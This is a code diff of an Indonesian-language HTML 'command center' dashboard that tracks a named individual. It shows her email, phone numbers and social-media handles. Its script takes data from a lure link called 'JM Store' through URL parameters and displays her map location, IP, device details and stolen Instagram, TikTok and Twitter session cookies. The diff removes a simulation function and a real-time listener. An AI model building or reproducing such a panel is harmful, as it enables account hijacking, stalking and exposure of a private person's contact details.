@@ -6,97 +6,25 @@
 <title>ZeroTrace Command Center</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 <style>
-:root {
-  --bg: #0a0a0f;
-  --card: #111122;
-  --border: #1a3a1a;
-  --green: #00ff00;
-  --cyan: #00ccff;
-  --red: #ff3333;
-  --yellow: #ffcc00;
-}
+:root { --bg: #0a0a0f; --card: #111122; --border: #1a3a1a; --green: #00ff00; --cyan: #00ccff; }
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body {
-  font-family: 'Courier New', monospace;
-  background: var(--bg);
-  color: var(--green);
-  display: flex;
-  height: 100vh;
-  overflow: hidden;
-}
-.panel {
-  padding: 20px;
-  overflow-y: auto;
-  border-right: 1px solid var(--border);
-}
+body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--green); display: flex; height: 100vh; overflow: hidden; }
+.panel { padding: 20px; overflow-y: auto; border-right: 1px solid var(--border); }
 .panel-left { width: 32%; background: #0d0d14; }
 .panel-right { width: 68%; background: var(--bg); }
-h2 {
-  font-size: 15px;
-  margin-bottom: 15px;
-  border-bottom: 1px solid var(--green);
-  padding-bottom: 10px;
-  letter-spacing: 2px;
-  text-transform: uppercase;
-}
-.card {
-  background: var(--card);
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  padding: 15px;
-  margin-bottom: 15px;
-  transition: all 0.3s;
-}
+h2 { font-size: 15px; margin-bottom: 15px; border-bottom: 1px solid var(--green); padding-bottom: 10px; letter-spacing: 2px; text-transform: uppercase; }
+.card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 15px; margin-bottom: 15px; transition: all 0.3s; }
 .card-title { font-size: 14px; color: var(--cyan); margin-bottom: 8px; font-weight: bold; }
 .card-value { font-size: 13px; color: var(--green); word-break: break-all; line-height: 1.6; }
-.log-entry {
-  font-size: 11px;
-  color: #008800;
-  margin: 4px 0;
-  border-left: 2px solid var(--green);
-  padding-left: 10px;
-  animation: fadeIn 0.5s ease;
-}
+.log-entry { font-size: 11px; color: #008800; margin: 4px 0; border-left: 2px solid var(--green); padding-left: 10px; animation: fadeIn 0.5s ease; }
 .log-time { color: var(--cyan); }
-.badge {
-  display: inline-block;
-  padding: 3px 8px;
-  background: #003300;
-  color: var(--green);
-  border-radius: 4px;
-  font-size: 11px;
-  margin: 2px;
-  border: 1px solid var(--green);
-}
-#map {
-  height: 300px;
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  margin-bottom: 15px;
-  background: #000;
-}
-.btn-simulate {
-  background: #004400;
-  color: var(--green);
-  border: 1px solid var(--green);
-  padding: 10px 20px;
-  cursor: pointer;
-  font-family: 'Courier New', monospace;
-  margin: 10px 5px;
-  transition: 0.2s;
-}
-.btn-simulate:hover {
-  background: #008800;
-  color: #000;
-}
+.badge { display: inline-block; padding: 3px 8px; background: #003300; color: var(--green); border-radius: 4px; font-size: 11px; margin: 2px; border: 1px solid var(--green); }
+#map { height: 300px; border: 1px solid var(--border); border-radius: 8px; margin-bottom: 15px; background: #000; }
 @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
-@keyframes pulse { 0% { box-shadow: 0 0 5px #00ff00; } 50% { box-shadow: 0 0 20px #00ff00; } 100% { box-shadow: 0 0 5px #00ff00; } }
-.pulse { animation: pulse 2s infinite; }
 </style>
 </head>
 <body>
 
-<!-- PANEL KIRI: Target & Live Events -->
 <div class="panel panel-left">
   <h2>🎯 TARGET DATABASE</h2>
   <div class="card" id="target-card">
@@ -104,7 +32,7 @@ h2 {
     <div class="card-value">📧 Email: riskajm32@gmail.com</div>
     <div class="card-value">📱 HP 1: 085864457028 <span class="badge">Indosat</span></div>
     <div class="card-value">📱 HP 2: 085268902105</div>
-    <div class="card-value" style="margin-top: 8px;">
+    <div class="card-value" style="margin-top: 8px;" id="socmed-badges">
       <span class="badge">IG: __13bbe</span>
       <span class="badge">IG: rzkzlw</span>
       <span class="badge">TT: __13bbe</span>
@@ -117,12 +45,8 @@ h2 {
   <div id="live-events">
     <p class="log-entry"><span class="log-time">[--:--]</span> Menunggu target terhubung...</p>
   </div>
-
-  <h2>🔧 SIMULASI UJI</h2>
-  <button class="btn-simulate" onclick="simulateTarget()">🎯 Kirim Target (Simulasi)</button>
 </div>
 
-<!-- PANEL KANAN: Dashboard Intelijen -->
 <div class="panel panel-right">
   <h2>📍 LOKASI TERAKHIR TARGET</h2>
   <div id="map"></div>
@@ -134,9 +58,7 @@ h2 {
   </div>
   <div class="card">
     <div class="card-title">📸 Sosial Media Terdeteksi</div>
-    <div class="card-value" id="socmed-info">
-      Belum ada data tambahan.
-    </div>
+    <div class="card-value" id="socmed-info">Belum ada data tambahan.</div>
   </div>
   <div class="card">
     <div class="card-title">🔑 Cookie Sesi (Instagram/TikTok)</div>
@@ -145,103 +67,47 @@ h2 {
   <div class="card">
     <div class="card-title">📋 Log Koneksi Target</div>
     <div id="connection-log">
-      <p class="log-entry"><span class="log-time">[SISTEM]</span> Dashboard siap. Menunggu target klik link JM Store...</p>
+      <p class="log-entry"><span class="log-time">[SISTEM]</span> Dashboard siap. Menunggu klik dari JM Store...</p>
     </div>
   </div>
 </div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-// ========== INISIALISASI PETA ==========
 var map = L.map('map').setView([-2.5, 118], 5);
 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
   attribution: '&copy; OpenStreetMap contributors'
 }).addTo(map);
 var markers = [];
 
-// ========== FUNGSI UTAMA: TAMBAH TITIK TARGET ==========
 function addTargetPoint(lat, lon, info, deviceData, cookies) {
-  // Hapus marker lama
   markers.forEach(m => map.removeLayer(m));
   markers = [];
-
   var marker = L.marker([lat, lon]).addTo(map);
   marker.bindPopup(info).openPopup();
   markers.push(marker);
   map.setView([lat, lon], 16);
-
   var now = new Date().toLocaleTimeString('id-ID');
-
-  // Update Live Events
   var eventsDiv = document.getElementById('live-events');
   eventsDiv.innerHTML = '<p class="log-entry"><span class="log-time">[' + now + ']</span> 🔴 TARGET TERKUNCI di ' + info + '</p>' + eventsDiv.innerHTML;
-
-  // Update Connection Log
   var logDiv = document.getElementById('connection-log');
   logDiv.innerHTML = '<p class="log-entry"><span class="log-time">[' + now + ']</span> 🚨 Target terhubung! Koordinat: ' + lat + ', ' + lon + '</p>' + logDiv.innerHTML;
-
-  // Update Device Info
-  if (deviceData) {
-    document.getElementById('device-info').innerHTML = deviceData;
-  }
-
-  // Update Cookie Info
-  if (cookies) {
-    document.getElementById('cookie-info').innerHTML = cookies;
-  }
-
-  // Update Social Media Info
-  document.getElementById('socmed-info').innerHTML = `
-    <span class="badge">IG: __13bbe</span>
-    <span class="badge">IG: rzkzlw</span>
-    <span class="badge">TikTok: __13bbe</span>
-    <span class="badge">Twitter: riskajm32</span>
-    <span class="badge">Saweria: riskajm</span>
-    <br><small style="color:#888;">+ ${deviceData ? '2 platform baru terdeteksi' : 'menunggu sinkronisasi...'}</small>
-  `;
+  if (deviceData) document.getElementById('device-info').innerHTML = deviceData;
+  if (cookies) document.getElementById('cookie-info').innerHTML = cookies;
+  document.getElementById('socmed-info').innerHTML = 'Data otomatis terkirim dari JM Store. ' + (deviceData || '');
 }
 
-// ========== SIMULASI UJI COBA ==========
-function simulateTarget() {
-  // Data simulasi seolah target mengklik JM Store
-  addTargetPoint(
-    -7.2756, 112.7942,  // Koordinat Surabaya (contoh)
-    "Surabaya Timur - IP: 182.253.117.42 - Provider: Indosat Ooredoo",
-    "📱 Android 14 | Samsung Galaxy A55<br>🖥 Browser: Chrome 134<br>🌐 IP: 182.253.117.42<br>📡 Provider: Indosat<br>📍 Koordinat: -7.2756, 112.7942",
-    "🍪 sessionid=abc123def456 (Instagram)<br>🍪 tt_chain_token=xyz789 (TikTok)<br>🍪 xs=25... (Twitter)"
-  );
-  console.log('[ZeroTrace] Simulasi target berhasil dikirim.');
-}
-
-// ========== TERIMA DATA DARI JM STORE (VIA PARAMETER URL) ==========
 window.addEventListener('load', function() {
   var params = new URLSearchParams(window.location.search);
   if (params.get('target') === 'alpha') {
-    var lat = parseFloat(params.get('lat')) || -7.25;
-    var lon = parseFloat(params.get('lon')) || 112.75;
+    var lat = parseFloat(params.get('lat')) || -7.2756;
+    var lon = parseFloat(params.get('lon')) || 112.7942;
     var info = params.get('info') || 'Surabaya - Data dari JM Store';
     var dev = params.get('dev') || '📱 Device otomatis terkirim';
     var ck = params.get('ck') || '🍪 Cookie otomatis terkirim';
     addTargetPoint(lat, lon, info, dev, ck);
   }
 });
-
-// ========== BROADCAST CHANNEL (Untuk koneksi real-time antar tab) ==========
-try {
-  var channel = new BroadcastChannel('zerotrace_ops');
-  channel.onmessage = function(event) {
-    var data = event.data;
-    if (data.type === 'target_click') {
-      addTargetPoint(data.lat, data.lon, data.info, data.device, data.cookies);
-    } else if (data.type === 'new_device') {
-      document.getElementById('device-info').innerHTML = data.device;
-      var logDiv = document.getElementById('connection-log');
-      logDiv.innerHTML = '<p class="log-entry"><span class="log-time">[' + new Date().toLocaleTimeString('id-ID') + ']</span> ' + data.device + '</p>' + logDiv.innerHTML;
-    }
-  };
-} catch(e) { console.log('BroadcastChannel not supported'); }
-
-console.log('[ZeroTrace] Command Center siap.');
 </script>
 </body>
 </html>
